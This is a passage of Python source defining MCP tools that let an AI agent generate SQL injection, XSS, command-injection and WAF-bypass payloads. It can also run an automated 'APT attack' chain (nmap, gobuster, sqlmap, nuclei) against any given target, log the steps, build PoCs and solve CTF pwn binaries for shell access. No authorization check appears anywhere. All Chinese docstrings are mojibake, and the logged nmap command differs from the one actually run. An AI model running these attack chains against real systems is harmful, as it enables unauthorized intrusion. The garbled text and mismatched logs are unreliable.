        Returns:
            æ™ºèƒ½ç”Ÿæˆçš„Payloadåˆ—è¡¨ï¼ŒåŒ…å«ç¼–ç ã€æ··æ·†å’ŒæˆåŠŸç‡ä¼°ç®—
        """
        data = {
            "vulnerability_type": vulnerability_type,
            "target_info": target_info or {},
            "evasion_level": evasion_level,
            "quantity": quantity
        }
        return executor.execute_tool_with_data("intelligent_payload", data)

    @mcp.tool()
    def generate_waf_bypass_payload(vulnerability_type: str, waf_type: str = "unknown",
                                  original_payload: str = "") -> Dict[str, Any]:
        """
        ç”ŸæˆWAFç»•è¿‡Payload - ä¸“é—¨é’ˆå¯¹Webåº”ç”¨é˜²ç«å¢™çš„ç»•è¿‡æŠ€æœ¯ã€‚

        Args:
            vulnerability_type: æ¼æ´ç±»å‹
            waf_type: WAFç±»å‹ (cloudflare, akamai, imperva, unknown)
            original_payload: åŸå§‹Payloadï¼ˆå¯é€‰ï¼‰

        Returns:
            WAFç»•è¿‡Payloadåˆ—è¡¨ï¼ŒåŒ…å«å¤šç§ç¼–ç å’Œè§„é¿æŠ€æœ¯
        """
        data = {
            "vulnerability_type": vulnerability_type,
            "waf_type": waf_type,
            "original_payload": original_payload
        }
        return executor.execute_tool_with_data("waf_bypass_payload", data)

    @mcp.tool()
    def generate_polyglot_payload(target_contexts: List[str], target_info: Dict = None) -> Dict[str, Any]:
        """
        ç”Ÿæˆå¤šè¯­è¨€é€šç”¨Payload - åœ¨å¤šä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒä¸­éƒ½èƒ½æ‰§è¡Œçš„Payloadã€‚

        Args:
            target_contexts: ç›®æ ‡ä¸Šä¸‹æ–‡åˆ—è¡¨ (html, javascript, url, sqlç­‰)
            target_info: ç›®æ ‡ç¯å¢ƒä¿¡æ¯

        Returns:
            å¤šè¯­è¨€é€šç”¨Payloadï¼Œå¯åœ¨å¤šç§ç¯å¢ƒä¸­æ‰§è¡Œ
        """
        data = {
            "target_contexts": target_contexts,
            "target_info": target_info or {}
        }
        return executor.execute_tool_with_data("polyglot_payload", data)

    @mcp.tool()
    def get_payload_templates() -> Dict[str, Any]:
        """
        è·å–å¯ç”¨çš„Payloadæ¨¡æ¿åº“ - æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„æ¼æ´ç±»å‹å’Œæ¨¡æ¿ã€‚

        Returns:
            å®Œæ•´çš„Payloadæ¨¡æ¿åº“ä¿¡æ¯ï¼ŒåŒ…å«æ”¯æŒçš„æ¼æ´ç±»å‹å’Œå¹³å°
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def update_payload_feedback(payload_info: Dict, success: bool) -> Dict[str, Any]:
        """
        æ›´æ–°PayloadæˆåŠŸç‡åé¦ˆ - å¸®åŠ©ç³»ç»Ÿå­¦ä¹ å’Œä¼˜åŒ–Payloadç”Ÿæˆã€‚

        Args:
            payload_info: Payloadä¿¡æ¯ (vulnerability_type, target_platformç­‰)
            success: æ˜¯å¦æˆåŠŸæ‰§è¡Œ

        Returns:
            åé¦ˆæ›´æ–°ç»“æœ
        """
        data = {
            "payload_info": payload_info,
            "success": success
        }
        return executor.execute_tool_with_data("payload_feedback", data)

    @mcp.tool()
    def intelligent_sql_injection_payloads(target_url: str, database_type: str = "unknown",
                                         waf_detected: bool = False) -> Dict[str, Any]:
        """
        æ™ºèƒ½SQLæ³¨å…¥Payloadç”Ÿæˆå™¨ - é’ˆå¯¹SQLæ³¨å…¥çš„ä¸“é—¨åŒ–Payloadç”Ÿæˆã€‚

        Args:
            target_url: ç›®æ ‡URL
            database_type: æ•°æ®åº“ç±»å‹ (mysql, postgresql, mssql, oracle, sqlite)
            waf_detected: æ˜¯å¦æ£€æµ‹åˆ°WAF

        Returns:
            é’ˆå¯¹æ€§çš„SQLæ³¨å…¥Payloadåˆ—è¡¨
        """
        target_info = {
            "platform": database_type,
            "application": "database",
            "waf_detected": waf_detected,
            "url": target_url
        }

        evasion_level = "high" if waf_detected else "medium"

        return generate_intelligent_payload("sql_injection", target_info, evasion_level, 10)

    @mcp.tool()
    def intelligent_xss_payloads(target_url: str, browser_type: str = "chrome",
                               content_type: str = "html") -> Dict[str, Any]:
        """
        æ™ºèƒ½XSS Payloadç”Ÿæˆå™¨ - é’ˆå¯¹è·¨ç«™è„šæœ¬çš„ä¸“é—¨åŒ–Payloadç”Ÿæˆã€‚

        Args:
            target_url: ç›®æ ‡URL
            browser_type: æµè§ˆå™¨ç±»å‹ (chrome, firefox, safari, ie)
            content_type: å†…å®¹ç±»å‹ (html, json, xml)

        Returns:
            é’ˆå¯¹æ€§çš„XSS Payloadåˆ—è¡¨
        """
        target_info = {
            "platform": browser_type,
            "application": "web",
            "content_type": content_type,
            "url": target_url
        }

        return generate_intelligent_payload("xss", target_info, "medium", 8)

    @mcp.tool()
    def intelligent_command_injection_payloads(target_url: str, os_type: str = "linux",
                                             blind_injection: bool = False) -> Dict[str, Any]:
        """
        æ™ºèƒ½å‘½ä»¤æ³¨å…¥Payloadç”Ÿæˆå™¨ - é’ˆå¯¹å‘½ä»¤æ³¨å…¥çš„ä¸“é—¨åŒ–Payloadç”Ÿæˆã€‚

        Args:
            target_url: ç›®æ ‡URL
            os_type: æ“ä½œç³»ç»Ÿç±»å‹ (linux, windows, macos)
            blind_injection: æ˜¯å¦ä¸ºç›²æ³¨

        Returns:
            é’ˆå¯¹æ€§çš„å‘½ä»¤æ³¨å…¥Payloadåˆ—è¡¨
        """
        target_info = {
            "platform": os_type,
            "operating_system": os_type,
            "injection_type": "blind" if blind_injection else "direct",
            "url": target_url
        }

        return generate_intelligent_payload("command_injection", target_info, "medium", 8)

    @mcp.tool()
    def ctf_payload_solver(challenge_url: str, challenge_type: str = "unknown",
                         hints: List[str] = None) -> Dict[str, Any]:
        """
        CTF Payloadæ±‚è§£å™¨ - ä¸“é—¨é’ˆå¯¹CTFç«èµ›çš„Payloadç”Ÿæˆå’Œæµ‹è¯•ã€‚

        Args:
            challenge_url: CTFé¢˜ç›®URL
            challenge_type: é¢˜ç›®ç±»å‹ (web, pwn, misc)
            hints: é¢˜ç›®æç¤ºåˆ—è¡¨

        Returns:
            CTFä¸“ç”¨Payloadè§£å†³æ–¹æ¡ˆ
        """
        if not hints:
            hints = []

        # åˆ†æé¢˜ç›®ç±»å‹å’Œæç¤ºï¼Œç”Ÿæˆå¯¹åº”çš„Payloadç­–ç•¥
        payload_strategies = []

        if challenge_type == "web" or any("web" in hint.lower() for hint in hints):
            # Webç±»é¢˜ç›®ï¼Œç”Ÿæˆå¸¸è§Webæ¼æ´Payload
            strategies = [
                {"type": "sql_injection", "priority": "high"},
                {"type": "xss", "priority": "medium"},
                {"type": "lfi", "priority": "medium"},
                {"type": "command_injection", "priority": "high"}
            ]
            payload_strategies.extend(strategies)

        elif challenge_type == "pwn" or any("pwn" in hint.lower() for hint in hints):
            # Pwnç±»é¢˜ç›®ï¼Œç”ŸæˆäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨Payload
            strategies = [
                {"type": "rce", "priority": "high"},
                {"type": "command_injection", "priority": "high"},
                {"type": "deserialization", "priority": "medium"}
            ]
            payload_strategies.extend(strategies)

        else:
            # é€šç”¨ç­–ç•¥ï¼Œå°è¯•æ‰€æœ‰å¯èƒ½çš„æ¼æ´ç±»å‹
            strategies = [
                {"type": "sql_injection", "priority": "medium"},
                {"type": "xss", "priority": "medium"},
                {"type": "command_injection", "priority": "medium"},
                {"type": "lfi", "priority": "low"}
            ]
            payload_strategies.extend(strategies)

        # ä¸ºæ¯ç§ç­–ç•¥ç”ŸæˆPayload
        ctf_payloads = {}
        for strategy in payload_strategies:
            vuln_type = strategy["type"]
            target_info = {
                "platform": "ctf",
                "application": "ctf_challenge",
                "challenge_type": challenge_type,
                "hints": hints
            }

            payload_result = generate_intelligent_payload(vuln_type, target_info, "high", 5)
            ctf_payloads[vuln_type] = payload_result

        return {
            "success": True,
            "challenge_url": challenge_url,
            "challenge_type": challenge_type,
            "hints": hints,
            "payload_strategies": payload_strategies,
            "generated_payloads": ctf_payloads,
            "message": f"CTF Payloadæ±‚è§£å™¨å·²ç”Ÿæˆ {len(payload_strategies)} ç§æ”»å‡»ç­–ç•¥"
        }

    # ==================== PoCç”Ÿæˆå’Œæ”»å‡»æ—¥å¿—MCPå·¥å…· ====================

    @mcp.tool()
    def start_attack_session(target: str, mode: str = "apt", session_name: str = "") -> Dict[str, Any]:
        """
        å¼€å§‹æ–°çš„æ”»å‡»ä¼šè¯ - å¯åŠ¨è‡ªåŠ¨æ—¥å¿—è®°å½•å’ŒPoCç”Ÿæˆã€‚

        Args:
            target: ç›®æ ‡IPåœ°å€ã€åŸŸåæˆ–URL
            mode: æ”»å‡»æ¨¡å¼ ("apt" æˆ– "ctf")
            session_name: è‡ªå®šä¹‰ä¼šè¯åç§°ï¼ˆå¯é€‰ï¼‰

        Returns:
            ä¼šè¯å¯åŠ¨ç»“æœï¼ŒåŒ…å«ä¼šè¯IDå’Œé…ç½®ä¿¡æ¯
        """
        data = {
            "target": target,
            "mode": mode,
            "session_name": session_name
        }
        return executor.execute_tool_with_data("attack_session", data)

    @mcp.tool()
    def log_attack_step(tool_name: str, command: str, success: bool, output: str,
                       parameters: Dict[str, Any] = None, error: str = "", payload: str = "") -> Dict[str, Any]:
        """
        è®°å½•æ”»å‡»æ­¥éª¤ - å®æ—¶è®°å½•æ¯ä¸ªå·¥å…·çš„æ‰§è¡Œç»“æœã€‚

        Args:
            tool_name: ä½¿ç”¨çš„å·¥å…·åç§°
            command: æ‰§è¡Œçš„å‘½ä»¤
            success: æ˜¯å¦æ‰§è¡ŒæˆåŠŸ
            output: å·¥å…·è¾“å‡ºç»“æœ
            parameters: å·¥å…·å‚æ•°ï¼ˆå¯é€‰ï¼‰
            error: é”™è¯¯ä¿¡æ¯ï¼ˆå¯é€‰ï¼‰
            payload: ä½¿ç”¨çš„Payloadï¼ˆå¯é€‰ï¼‰

        Returns:
            æ­¥éª¤è®°å½•ç»“æœï¼ŒåŒ…å«å‘ç°çš„æ¼æ´å’ŒFlagä¿¡æ¯
        """
        data = {
            "tool_name": tool_name,
            "command": command,
            "success": success,
            "output": output,
            "parameters": parameters or {},
            "error": error,
            "payload": payload
        }
        return executor.execute_tool_with_data("log_step", data)

    @mcp.tool()
    def end_attack_session() -> Dict[str, Any]:
        """
        ç»“æŸå½“å‰æ”»å‡»ä¼šè¯ - å®Œæˆæ—¥å¿—è®°å½•å¹¶ä¿å­˜ä¼šè¯æ•°æ®ã€‚

        Returns:
            ä¼šè¯ç»“æŸç»“æœï¼ŒåŒ…å«å®Œæ•´çš„æ”»å‡»ç»Ÿè®¡ä¿¡æ¯
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def generate_poc_from_session(session_id: str) -> Dict[str, Any]:
        """
        ä»æŒ‡å®šæ”»å‡»ä¼šè¯ç”ŸæˆPoC - è‡ªåŠ¨åˆ†ææ”»å‡»é“¾å¹¶ç”Ÿæˆå¤šç§æ ¼å¼çš„PoCã€‚

        Args:
            session_id: æ”»å‡»ä¼šè¯ID

        Returns:
            ç”Ÿæˆçš„PoCç»“æœï¼ŒåŒ…å«Pythonã€Bashã€CTFè§£é¢˜è„šæœ¬å’ŒMarkdownæŠ¥å‘Š
        """
        data = {"session_id": session_id}
        return executor.execute_tool_with_data("generate_poc", data)

    @mcp.tool()
    def generate_poc_from_current_session() -> Dict[str, Any]:
        """
        ä»å½“å‰æ´»è·ƒä¼šè¯ç”ŸæˆPoC - æ— éœ€æŒ‡å®šä¼šè¯IDï¼Œç›´æ¥ä»å½“å‰ä¼šè¯ç”Ÿæˆã€‚

        Returns:
            ç”Ÿæˆçš„PoCç»“æœï¼Œè‡ªåŠ¨ä¿å­˜åˆ°æ–‡ä»¶
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def get_attack_session_details(session_id: str) -> Dict[str, Any]:
        """
        è·å–æ”»å‡»ä¼šè¯è¯¦æƒ… - æŸ¥çœ‹æŒ‡å®šä¼šè¯çš„å®Œæ•´æ”»å‡»å†å²ã€‚

        Args:
            session_id: æ”»å‡»ä¼šè¯ID

        Returns:
            è¯¦ç»†çš„ä¼šè¯ä¿¡æ¯ï¼ŒåŒ…å«æ‰€æœ‰æ”»å‡»æ­¥éª¤å’Œç»“æœ
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def list_attack_sessions() -> Dict[str, Any]:
        """
        è·å–æ‰€æœ‰æ”»å‡»ä¼šè¯åˆ—è¡¨ - æŸ¥çœ‹å†å²å’Œå½“å‰çš„æ‰€æœ‰æ”»å‡»ä¼šè¯ã€‚

        Returns:
            æ‰€æœ‰æ”»å‡»ä¼šè¯çš„æ‘˜è¦ä¿¡æ¯
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def list_poc_templates() -> Dict[str, Any]:
        """
        è·å–å¯ç”¨çš„PoCæ¨¡æ¿ - æŸ¥çœ‹ç³»ç»Ÿæ”¯æŒçš„æ‰€æœ‰PoCç”Ÿæˆæ¨¡æ¿ã€‚

        Returns:
            å¯ç”¨çš„PoCæ¨¡æ¿åˆ—è¡¨å’Œæè¿°ä¿¡æ¯
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def auto_apt_attack_with_poc(target: str, session_name: str = "") -> Dict[str, Any]:
        """
        è‡ªåŠ¨APTæ”»å‡»å¹¶ç”ŸæˆPoC - å®Œæ•´çš„APTæ”»å‡»é“¾ï¼Œè‡ªåŠ¨è®°å½•å’Œç”ŸæˆPoCã€‚

        è¿™ä¸ªå·¥å…·å°†ï¼š
        1. å¯åŠ¨APTæ¨¡å¼æ”»å‡»ä¼šè¯
        2. æ‰§è¡Œå…¨é¢çš„APTæ”»å‡»é“¾
        3. è‡ªåŠ¨è®°å½•æ‰€æœ‰æ”»å‡»æ­¥éª¤
        4. åœ¨æ”»å‡»å®Œæˆåç”ŸæˆPoC

        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–åŸŸå
            session_name: è‡ªå®šä¹‰ä¼šè¯åç§°ï¼ˆå¯é€‰ï¼‰

        Returns:
            å®Œæ•´çš„APTæ”»å‡»ç»“æœå’Œç”Ÿæˆçš„PoCä¿¡æ¯
        """
        # 1. å¯åŠ¨æ”»å‡»ä¼šè¯
        session_result = start_attack_session(target, "apt", session_name or f"APT_Attack_{target}")

        if not session_result.get("success"):
            return {"error": "Failed to start attack session", "details": session_result}

        session_id = session_result.get("session_id")

        # 2. æ‰§è¡ŒAPTæ”»å‡»é“¾
        try:
            # é˜¶æ®µ1ï¼šä¾¦å¯Ÿ
            nmap_result = nmap_scan(target, "-sS", "80,443,22", "-T5 --open --min-rate 5000 --max-retries 1")
            log_attack_step("nmap", f"nmap -sV -sC -p1-1000 -T4 {target}",
                          nmap_result.get("success", False), str(nmap_result))

            # é˜¶æ®µ2ï¼šWebåº”ç”¨æ”»å‡»ï¼ˆå¦‚æœå‘ç°WebæœåŠ¡ï¼‰
            if "80" in str(nmap_result) or "443" in str(nmap_result):
                target_url = f"http://{target}"

                # ç›®å½•æ‰«æ
                gobuster_result = gobuster_scan(target_url, "dir", "/usr/share/wordlists/dirb/common.txt")
                log_attack_step("gobuster", f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/common.txt",
                              gobuster_result.get("success", False), str(gobuster_result))

                # SQLæ³¨å…¥æµ‹è¯•
                sqlmap_result = sqlmap_scan(target_url, "", "--batch --level=2")
                log_attack_step("sqlmap", f"sqlmap -u {target_url} --batch --level=2",
                              sqlmap_result.get("success", False), str(sqlmap_result))

                # Webæ¼æ´æ‰«æ
                nuclei_result = nuclei_web_scan(target_url, "comprehensive")
                log_attack_step("nuclei", f"nuclei -u {target_url} -t http/",
                              nuclei_result.get("success", False), str(nuclei_result))

            # 3. ç»“æŸæ”»å‡»ä¼šè¯
            end_result = end_attack_session()

            # 4. ç”ŸæˆPoC
            poc_result = generate_poc_from_session(session_id)

            return {
                "success": True,
                "session_id": session_id,
                "target": target,
                "attack_completed": True,
                "session_summary": end_result,
                "poc_generated": poc_result,
                "message": f"APTæ”»å‡»é“¾å·²å®Œæˆï¼ŒPoCå·²ç”Ÿæˆå¹¶ä¿å­˜"
            }

        except Exception as e:
            # å³ä½¿æ”»å‡»è¿‡ç¨‹ä¸­å‡ºé”™ï¼Œä¹Ÿå°è¯•ç”ŸæˆPoC
            try:
                end_attack_session()
                poc_result = generate_poc_from_session(session_id)
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "partial_poc": poc_result,
                    "message": "æ”»å‡»è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œä½†å·²ç”Ÿæˆéƒ¨åˆ†PoC"
                }
            except:
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "message": "æ”»å‡»å¤±è´¥ï¼Œæ— æ³•ç”ŸæˆPoC"
                }

    @mcp.tool()
    def auto_ctf_solve_with_poc(target: str, challenge_name: str = "", challenge_category: str = "web") -> Dict[str, Any]:
        """
        è‡ªåŠ¨CTFè§£é¢˜å¹¶ç”ŸæˆPoC - å®Œæ•´çš„CTFè§£é¢˜æµç¨‹ï¼Œè‡ªåŠ¨è®°å½•å’Œç”Ÿæˆè§£é¢˜è„šæœ¬ã€‚

        è¿™ä¸ªå·¥å…·å°†ï¼š
        1. å¯åŠ¨CTFæ¨¡å¼æ”»å‡»ä¼šè¯
        2. æ‰§è¡Œé’ˆå¯¹æ€§çš„CTFè§£é¢˜æ”»å‡»
        3. è‡ªåŠ¨æå–Flag
        4. ç”ŸæˆCTFè§£é¢˜è„šæœ¬

        Args:
            target: CTFé¢˜ç›®åœ°å€æˆ–IP
            challenge_name: é¢˜ç›®åç§°ï¼ˆå¯é€‰ï¼‰
            challenge_category: é¢˜ç›®åˆ†ç±» (web, pwn, crypto, misc)

        Returns:
            CTFè§£é¢˜ç»“æœå’Œç”Ÿæˆçš„è§£é¢˜è„šæœ¬
        """
        # 1. å¯åŠ¨CTFä¼šè¯
        session_name = challenge_name or f"CTF_{challenge_category}_{target}"
        session_result = start_attack_session(target, "ctf", session_name)

        if not session_result.get("success"):
            return {"error": "Failed to start CTF session", "details": session_result}

        session_id = session_result.get("session_id")

        try:
            # 2. æ‰§è¡ŒCTFè§£é¢˜ç­–ç•¥
            if challenge_category == "web":
                # Webé¢˜ç›®è§£é¢˜æµç¨‹

                # å¿«é€Ÿç«¯å£æ‰«æ
                nmap_result = nmap_scan(target, "-sV", "80,443,8080,8000,3000", "-T4")
                log_attack_step("nmap", f"nmap -sV -p80,443,8080,8000,3000 {target}",
                              nmap_result.get("success", False), str(nmap_result))

                target_url = f"http://{target}" if not target.startswith("http") else target

                # ç›®å½•æš´åŠ›ç ´è§£
                gobuster_result = gobuster_scan(target_url, "dir", "/usr/share/wordlists/dirb/big.txt", "-x php,txt,html,js")
                log_attack_step("gobuster", f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js",
                              gobuster_result.get("success", False), str(gobuster_result))

                # SQLæ³¨å…¥å¿«é€Ÿæµ‹è¯•
                sqlmap_result = sqlmap_scan(target_url, "", "--batch --level=3 --risk=3")
                log_attack_step("sqlmap", f"sqlmap -u {target_url} --batch --level=3 --risk=3",
                              sqlmap_result.get("success", False), str(sqlmap_result))

                # Webæ¼æ´æ‰«æ
                nuclei_result = nuclei_web_scan(target_url, "comprehensive")
                log_attack_step("nuclei", f"nuclei -u {target_url} -t web-vulnerabilities/",
                              nuclei_result.get("success", False), str(nuclei_result))

            elif challenge_category == "pwn":
                # Pwné¢˜ç›®è§£é¢˜æµç¨‹
                nmap_result = nmap_scan(target, "-sV -sC", "", "-T4")
                log_attack_step("nmap", f"nmap -sV -sC {target}",
                              nmap_result.get("success", False), str(nmap_result))

            else:
                # é€šç”¨è§£é¢˜æµç¨‹
                nmap_result = nmap_scan(target, "-sV", "", "-T4")
                log_attack_step("nmap", f"nmap -sV {target}",
                              nmap_result.get("success", False), str(nmap_result))

            # 3. ç»“æŸCTFä¼šè¯
            end_result = end_attack_session()

            # 4. ç”ŸæˆCTFè§£é¢˜è„šæœ¬
            poc_result = generate_poc_from_session(session_id)

            return {
                "success": True,
                "session_id": session_id,
                "target": target,
                "challenge_category": challenge_category,
                "flags_found": end_result.get("flags_found", 0),
                "ctf_completed": True,
                "session_summary": end_result,
                "solver_script": poc_result,
                "message": f"CTF {challenge_category} é¢˜ç›®è§£é¢˜å®Œæˆï¼Œè§£é¢˜è„šæœ¬å·²ç”Ÿæˆ"
            }

        except Exception as e:
            # å³ä½¿è§£é¢˜è¿‡ç¨‹ä¸­å‡ºé”™ï¼Œä¹Ÿå°è¯•ç”Ÿæˆè„šæœ¬
            try:
                end_attack_session()
                poc_result = generate_poc_from_session(session_id)
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "partial_script": poc_result,
                    "message": "CTFè§£é¢˜è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œä½†å·²ç”Ÿæˆéƒ¨åˆ†è§£é¢˜è„šæœ¬"
                }
            except:
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "message": "CTFè§£é¢˜å¤±è´¥ï¼Œæ— æ³•ç”Ÿæˆè§£é¢˜è„šæœ¬"
                }

    @mcp.tool()
    def intelligent_attack_with_poc(target: str, mode: str = "apt", objectives: List[str] = None) -> Dict[str, Any]:
        """
        æ™ºèƒ½åŒ–æ”»å‡»å¹¶è‡ªåŠ¨ç”ŸæˆPoC - æœ€é«˜çº§åˆ«çš„è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•ã€‚

        ç»“åˆäº†ï¼š
        - å‚æ•°ä¼˜åŒ–
        - ç»“æœå…³è”åˆ†æ
        - è‡ªé€‚åº”æ”»å‡»ç­–ç•¥
        - æ™ºèƒ½Payloadç”Ÿæˆ
        - è‡ªåŠ¨PoCç”Ÿæˆ

        Args:
            target: ç›®æ ‡IPåœ°å€ã€åŸŸåæˆ–URL
            mode: æ”»å‡»æ¨¡å¼ ("apt" æˆ– "ctf")
            objectives: æ”»å‡»ç›®æ ‡åˆ—è¡¨ï¼ˆå¯é€‰ï¼‰

        Returns:
            å®Œæ•´çš„æ™ºèƒ½åŒ–æ”»å‡»ç»“æœå’Œå¤šæ ¼å¼PoC
        """
        # 1. å¯åŠ¨æ™ºèƒ½æ”»å‡»ä¼šè¯
        session_result = start_attack_session(target, mode, f"Intelligent_{mode.upper()}_{target}")

        if not session_result.get("success"):
            return {"error": "Failed to start intelligent attack session", "details": session_result}

        session_id = session_result.get("session_id")

        try:
            # 2. æ‰§è¡Œæ™ºèƒ½åŒ–æ”»å‡»æµç¨‹
            results = {}

            # æ™ºèƒ½å‚æ•°ä¼˜åŒ–æ‰«æ
            if mode == "apt":
                # APTæ¨¡å¼ï¼šå…¨é¢æ¸—é€æµ‹è¯•
                results["vulnerability_assessment"] = intelligent_vulnerability_assessment(target, "comprehensive")
                results["penetration_test"] = intelligent_penetration_testing(target, "single", "owasp")
            else:
                # CTFæ¨¡å¼ï¼šå¿«é€Ÿè§£é¢˜
                results["ctf_solver"] = intelligent_ctf_solver(target, "unknown", "30min")

            # è®°å½•æ™ºèƒ½æ”»å‡»ç»“æœ
            for phase, result in results.items():
                log_attack_step("intelligent_system", f"{phase} on {target}",
                              result.get("success", False), str(result))

            # 3. ç»“æŸæ™ºèƒ½æ”»å‡»ä¼šè¯
            end_result = end_attack_session()

            # 4. ç”Ÿæˆé«˜çº§PoC
            poc_result = generate_poc_from_session(session_id)

            return {
                "success": True,
                "session_id": session_id,
                "target": target,
                "mode": mode,
                "intelligent_results": results,
                "session_summary": end_result,
                "advanced_poc": poc_result,
                "total_vulnerabilities": end_result.get("vulnerabilities_found", 0),
                "flags_found": end_result.get("flags_found", 0),
                "compromise_level": end_result.get("compromise_level", "none"),
                "message": f"æ™ºèƒ½åŒ–{mode.upper()}æ”»å‡»å®Œæˆï¼Œé«˜çº§PoCå·²ç”Ÿæˆ"
            }

        except Exception as e:
            try:
                end_attack_session()
                poc_result = generate_poc_from_session(session_id)
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "partial_results": poc_result,
                    "message": "æ™ºèƒ½æ”»å‡»è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œä½†å·²ç”Ÿæˆéƒ¨åˆ†ç»“æœ"
                }
            except:
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "message": "æ™ºèƒ½æ”»å‡»å¤±è´¥"
                }

    # ==================== PwnPasi PWNè‡ªåŠ¨åŒ–å·¥å…·é›†æˆ ====================

    @mcp.tool()
    def ctf_pwn_solver(binary_path: str, challenge_name: str = "", challenge_hints: List[str] = None,
                      time_limit: str = "quick") -> Dict[str, Any]:
        """
        CTF PWNé¢˜ç›®è‡ªåŠ¨æ±‚è§£å™¨ - ä¸“é—¨é’ˆå¯¹CTFæ¯”èµ›çš„PWNé¢˜ç›®

        ç»¼åˆä½¿ç”¨PwnPasiå’Œé€†å‘åˆ†ææŠ€æœ¯ï¼Œè‡ªåŠ¨è§£å†³CTF PWNé¢˜ç›®ï¼š
        1. äºŒè¿›åˆ¶ä¿æŠ¤åˆ†æ
        2. æ¼æ´ç±»å‹è¯†åˆ«
        3. åˆ©ç”¨ç­–ç•¥é€‰æ‹©
        4. è‡ªåŠ¨åŒ–æ”»å‡»æ‰§è¡Œ
        5. Flagæå–å’ŒéªŒè¯

        Args:
            binary_path: CTF PWNé¢˜ç›®äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„
            challenge_name: é¢˜ç›®åç§°ï¼ˆç”¨äºè®°å½•ï¼‰
            challenge_hints: é¢˜ç›®æç¤ºåˆ—è¡¨
            time_limit: æ—¶é—´é™åˆ¶ï¼ˆquick, standard, thoroughï¼‰

        Returns:
            CTF PWNæ±‚è§£ç»“æœï¼ŒåŒ…å«Flagå’Œè§£é¢˜è¿‡ç¨‹
        """
        if not challenge_hints:
            challenge_hints = []

        results = {
            "binary_path": binary_path,
            "challenge_name": challenge_name or f"PWN_Challenge_{os.path.basename(binary_path)}",
            "challenge_hints": challenge_hints,
            "time_limit": time_limit,
            "analysis_steps": {},
            "exploitation_attempts": [],
            "flags_found": [],
            "success": False
        }

        try:
            # å¯ç”¨CTFæ¨¡å¼
            enable_ctf_mode()

            # ç¬¬ä¸€æ­¥ï¼šäºŒè¿›åˆ¶åˆ†æ
            logger.info(f"Step 1: Binary analysis for {binary_path}")
            if os.path.exists(binary_path):
                # ä½¿ç”¨é€†å‘åˆ†æå·¥å…·åˆ†æäºŒè¿›åˆ¶
                binary_analysis = auto_reverse_analyze(binary_path)
                results["analysis_steps"]["1_binary_analysis"] = binary_analysis

                # ç¬¬äºŒæ­¥ï¼šPwnPasiè‡ªåŠ¨åŒ–æ”»å‡»
                logger.info(f"Step 2: PwnPasi automated exploitation")
                pwn_result = pwnpasi_auto_pwn(binary_path, verbose=True)
                results["exploitation_attempts"].append({
                    "tool": "pwnpasi",
                    "result": pwn_result,
                    "timestamp": datetime.datetime.now().isoformat()
                })

                # æ£€æŸ¥æ˜¯å¦è·å¾—shell
                if pwn_result.get("exploitation_result") == "shell_obtained":
                    results["success"] = True
                    results["shell_access"] = True

                    # å°è¯•æå–Flagï¼ˆä»è¾“å‡ºä¸­æŸ¥æ‰¾ï¼‰
                    stdout_content = pwn_result.get("stdout", "")
                    flag_patterns = [
                        r"flag\{[^}]+\}",
                        r"FLAG\{[^}]+\}",
                        r"ctf\{[^}]+\}",
                        r"CTF\{[^}]+\}"
                    ]

                    import re
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, stdout_content, re.IGNORECASE)
                        for match in matches:
                            if match not in results["flags_found"]:
                                results["flags_found"].append(match)

                # ç¬¬ä¸‰æ­¥ï¼šå¦‚æœPwnPasiå¤±è´¥ï¼Œå°è¯•å…¶ä»–æ–¹æ³•
                if not results["success"] and time_limit in ["standard", "thorough"]:
                    logger.info("Step 3: Alternative exploitation methods")

                    # å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ å…¶ä»–PWNæŠ€æœ¯
                    # æ¯”å¦‚æ‰‹åŠ¨ROPé“¾æ„é€ ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ç­‰
                    pass

            else:
                results["error"] = f"Binary file not found: {binary_path}"
                return results

            # è·å–CTFæ¨¡å¼ä¸‹æ£€æµ‹åˆ°çš„æ‰€æœ‰Flag
            detected_flags = get_detected_flags()
            if detected_flags.get("success"):
                ctf_flags = detected_flags.get("flags", [])
                for flag_info in ctf_flags:
                    flag_content = flag_info.get("flag", "")
                    if flag_content and flag_content not in results["flags_found"]:
                        results["flags_found"].append(flag_content)

            results["total_flags_found"] = len(results["flags_found"])
            results["message"] = f"CTF PWN solver completed - Found {results['total_flags_found']} flags"

            return results

        except Exception as e:
            logger.error(f"CTF PWN solver error: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            results["message"] = "CTF PWN solver failed"
            return results

    @mcp.tool()
    def quick_pwn_check(binary_path: str) -> Dict[str, Any]:
        """
